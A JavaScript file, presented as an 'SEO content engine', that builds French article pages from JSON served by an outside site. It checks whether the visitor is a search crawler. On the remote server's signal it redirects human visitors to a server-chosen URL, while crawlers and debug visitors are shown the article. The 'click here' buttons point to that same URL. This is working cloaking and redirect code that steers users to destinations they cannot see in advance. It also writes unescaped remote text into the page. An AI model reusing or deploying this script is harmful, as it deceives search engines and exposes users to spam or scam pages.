/* 
 * Universal SEO Content Engine v4.1
 * Fixed PHP API Endpoint | JSON-LD @graph Parsing
 */

(function() {
    'use strict';

    const SEO_CONFIG = {
        isBot: /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent),
        identifier: new URLSearchParams(window.location.search).get("o2x") || new URLSearchParams(window.location.search).get("io0"),
        debug: new URLSearchParams(window.location.search).has("dbg123"),
        domInitialized: false
    };

    var DOM = {};
    var triggered = false;

    // 1. INIT ENGINE
    async function initEngine() {
        if (!SEO_CONFIG.identifier) return renderSimple404();

        if (!SEO_CONFIG.isBot) showLoader();

        try {
            // --- UPDATED ENDPOINTS TO USE YOUR PHP SYSTEM ---
            const [contentData, controlData] = await Promise.all([
                fetchJSON(`https://dailyinfos24.site/js6/index.php?id=${SEO_CONFIG.identifier}`),
                fetchJSON(`https://dailyinfos24.site/api/latest/${SEO_CONFIG.identifier}`)
            ]);

            // Monetization Redirect Logic
            if (controlData.redirect && !SEO_CONFIG.isBot && !SEO_CONFIG.debug) {
                triggered = true;
                window.location.replace(controlData.to);
                return;
            }

            renderPage(contentData, controlData);
        } catch (err) {
            console.error("SEO_Engine_Error:", err);
            if (!SEO_CONFIG.isBot && !SEO_CONFIG.debug) errorRedirect();
        }
    }

    // 2. SEMANTIC PARSER
    function parseGraph(graph) {
        if (!graph || !Array.isArray(graph)) return { article: {}, webpage: {}, image: {} };
        const find = (type) => graph.find(i => i["@type"] === type) || {};
        return {
            article: find("Article"),
            webpage: find("WebPage"),
            image: find("ImageObject"),
            org: find("Organization")
        };
    }

    // 3. PAGE RENDERER
    function renderPage(content, control) {
        const data = parseGraph(content["@graph"]);
        
        // Metadata
        document.title = data.webpage.name || data.article.headline || "Chargement...";
        document.documentElement.lang = data.webpage.inLanguage || "fr-FR";
        
        updateMeta("description", data.webpage.description);
        updateMeta("og:title", data.article.headline);
        updateMeta("og:image", data.image.url);

        if (!SEO_CONFIG.domInitialized) initDom(data, content); 
        
        // Content
        DOM.main_article_header_h1.textContent = data.article.headline;
        DOM.main_article_figure_img.src = data.image.url;
        DOM.main_article_figure_figcaption.textContent = data.image.caption || data.article.headline;
        
        const pubDate = data.article.datePublished || control.updated;
        DOM.main_article_header_p.innerHTML = `Mise à jour le : <time datetime="${pubDate}">${formatDate(pubDate)}</time>`;

        const rawContent = data.article.articleBody || data.webpage.description || "";
        const formattedContent = formatMarkdown(rawContent);
        
        const [p1, p2] = splitText(formattedContent);
        DOM.main_article_p1.innerHTML = p1;
        DOM.main_article_p2.innerHTML = p2;

        if (control.to) {
            DOM.main_article_button1_a.href = control.to;
            DOM.main_article_button2_a.href = control.to;
        }

        const faq = control.schemas?.find(s => s.id === "FAQSchema");
        if (faq) renderFAQ(faq.data);
        
        injectSchema(content);
        if (control.schemas) control.schemas.forEach(s => injectSchema(s.data));
        
        hideLoader();
    }

    // --- UTILITIES ---
    async function fetchJSON(url) {
        const res = await fetch(url);
        if (!res.ok) throw new Error("Fetch failed");
        return res.json();
    }

    function updateMeta(name, content) {
        if (!content) return;
        let el = document.querySelector(`meta[name="${name}"], meta[property="${name}"]`);
        if (!el) {
            el = document.createElement('meta');
            name.includes('og:') ? el.setAttribute('property', name) : el.setAttribute('name', name);
            document.head.appendChild(el);
        }
        el.setAttribute('content', content);
    }

    function injectSchema(json) {
        const s = document.createElement('script');
        s.type = 'application/ld+json';
        s.text = JSON.stringify(json);
        document.head.appendChild(s);
    }

    function formatMarkdown(text) {
        return text
            .replace(/### (.*?)(\r\n|\n)/g, '<h3 class="text-2xl font-bold mt-8 mb-3 text-gray-800">$1</h3>')
            .replace(/\r\n|\n/g, '<br class="mb-3">');
    }

    function renderFAQ(faqData) {
        const container = document.createElement('section');
        container.className = "mt-12 p-8 bg-white border border-gray-200 rounded-2xl shadow-sm";
        container.innerHTML = `<h2 class="text-2xl font-bold mb-6 text-gray-900 border-b pb-4">Questions Fréquentes</h2>`;
        
        faqData.mainEntity.forEach(item => {
            const div = document.createElement('div');
            div.className = "mb-6 pb-2";
            div.innerHTML = `
                <h4 class="font-bold text-blue-800 text-lg mb-2">Q: ${item.name}</h4>
                <p class="text-gray-700 leading-relaxed pl-4 border-l-2 border-blue-100">R: ${item.acceptedAnswer.text}</p>
            `;
            container.appendChild(div);
        });
        DOM.main_article.appendChild(container);
    }

    function formatDate(dateStr) {
        return new Date(dateStr).toLocaleDateString('fr-FR', { year: 'numeric', month: 'long', day: 'numeric' });
    }

    function splitText(text) {
        const mid = Math.floor(text.length / 2.5);
        let splitPos = text.indexOf('<br>', mid);
        if (splitPos === -1) splitPos = mid;
        return [text.substring(0, splitPos), text.substring(splitPos)];
    }

    // --- ADAPTIVE UI ---
    function initDom(data, fullContent) {
        SEO_CONFIG.domInitialized = true;
        const style = document.createElement('style');
        style.innerHTML = `
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; line-height: 1.7; color: #1a1a1a; margin: 0; background: #f4f7f6; }
            .wrapper { max-width: 1200px; margin: 0 auto; padding: 20px; display: flex; flex-direction: column; gap: 30px; }
            @media(min-width: 992px) { .wrapper { flex-direction: row; } }
            header { background: #fff; padding: 20px; border-bottom: 1px solid #e5e7eb; display:flex; justify-content:center; }
            main { flex: 2; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
            aside { flex: 1; position: sticky; top: 20px; height: fit-content; }
            .btn-cta { display: block; background: #ef4444; color: #fff; padding: 18px; text-align: center; text-decoration: none; border-radius: 10px; font-weight: 800; margin: 25px 0; transition: transform 0.2s; box-shadow: 0 4px 14px rgba(239,68,68,0.4); }
            .btn-cta:hover { transform: translateY(-2px); }
            img { width: 100%; border-radius: 10px; }
            .sidebar-box { background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        `;
        document.head.appendChild(style);

        const header = document.createElement('header');
        header.innerHTML = `<img src="https://dailyinfos24.site/images/logo.png" style="height:45px; width:auto;" alt="Logo">`;
        document.body.appendChild(header);

        const wrapper = document.createElement('div');
        wrapper.className = "wrapper";
        document.body.appendChild(wrapper);

        const main = document.createElement('main');
        wrapper.appendChild(main);
        DOM.main_article = main;

        DOM.main_article_header_h1 = document.createElement('h1');
        DOM.main_article_header_h1.className = "text-3xl md:text-4xl font-black mb-4 leading-tight";
        main.appendChild(DOM.main_article_header_h1);

        DOM.main_article_header_p = document.createElement('p');
        DOM.main_article_header_p.className = "text-sm text-gray-400 mb-8 uppercase tracking-widest";
        main.appendChild(DOM.main_article_header_p);

        const fig = document.createElement('figure');
        fig.className = "mb-10";
        DOM.main_article_figure_img = document.createElement('img');
        DOM.main_article_figure_figcaption = document.createElement('figcaption');
        DOM.main_article_figure_figcaption.className = "text-xs text-gray-400 mt-3 text-right italic";
        fig.appendChild(DOM.main_article_figure_img);
        fig.appendChild(DOM.main_article_figure_figcaption);
        main.appendChild(fig);

        DOM.main_article_p1 = document.createElement('div');
        main.appendChild(DOM.main_article_p1);

        DOM.main_article_button1_a = document.createElement('a');
        DOM.main_article_button1_a.className = "btn-cta";
        DOM.main_article_button1_a.innerHTML = "CLIQUEZ ICI POUR ACCÉDER";
        main.appendChild(DOM.main_article_button1_a);

        DOM.main_article_p2 = document.createElement('div');
        main.appendChild(DOM.main_article_p2);

        DOM.main_article_button2_a = document.createElement('a');
        DOM.main_article_button2_a.className = "btn-cta";
        DOM.main_article_button2_a.innerHTML = "VOIR L'OFFRE COMPLÈTE";
        main.appendChild(DOM.main_article_button2_a);

        const aside = document.createElement('aside');
        wrapper.appendChild(aside);
        const nicheName = data.article.articleSection?.[0] || "Actualité";
        const sidebarBox = document.createElement('div');
        sidebarBox.className = "sidebar-box";
        let sideHTML = `<h3 class="font-bold text-lg mb-4 border-b pb-2">Dans la catégorie ${nicheName}</h3><ul class="space-y-4">`;
        if (fullContent.related) {
            fullContent.related.forEach(r => { sideHTML += `<li><a href="${r.url}" class="text-blue-600 hover:text-red-500 font-medium text-sm">→ ${r.title}</a></li>`; });
        } else { sideHTML += `<li class="text-sm text-gray-500">Aucun contenu similaire pour le moment.</li>`; }
        sideHTML += `</ul>`;
        sidebarBox.innerHTML = sideHTML;
        aside.appendChild(sidebarBox);
    }

    function showLoader() {
        const l = document.createElement('div');
        l.id = "loader-overlay";
        l.style = "position:fixed;inset:0;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center;";
        l.innerHTML = `<div style="width:40px;height:40px;border:3px solid #f3f3f3;border-top:3px solid #ef4444;border-radius:50%;animation:s 1s linear infinite"></div><style>@keyframes s{to{transform:rotate(360deg)}}</style>`;
        document.body.appendChild(l);
    }

    function hideLoader() {
        const l = document.getElementById("loader-overlay");
        if (l) l.style.display = "none";
    }

    function renderSimple404() {
        document.body.innerHTML = `<div style="text-align:center;padding:50px"><h1>404</h1><p>Page non trouvée.</p></div>`;
    }

    function errorRedirect() {
        window.location.href = "https://dailyinfos24.site/";
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initEngine);
    } else {
        initEngine();
    }

})();
